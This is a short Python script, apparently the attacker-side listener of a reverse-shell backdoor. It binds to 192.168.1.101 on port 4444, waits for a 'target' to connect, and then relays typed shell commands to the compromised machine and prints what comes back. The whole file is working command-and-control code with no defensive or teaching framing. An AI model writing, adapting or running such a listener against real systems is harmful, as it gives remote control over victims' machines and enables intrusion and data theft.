import socket
import json
import os
def reliable_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def reliable_recv():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def target_communication():
    while True:
        command = input('* Shell~%s:' % str(ip))
        reliable_send(command)
        if command == 'quit'or command == 'q':
            break
        elif command == 'clear':
            os.system('clear')
        elif command[:3] == 'cd ':
            pass
        else:
            result = reliable_recv()
            print(result)


LHOST = '192.168.1.101'
LPORT = 4444
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((LHOST, int(LPORT)))
print(LHOST)
print('[+] Listening For The Incoming Connections')
sock.listen(5)
target, ip = sock.accept()
print('[+] Target Connected From: ' + str(ip))
target_communication()
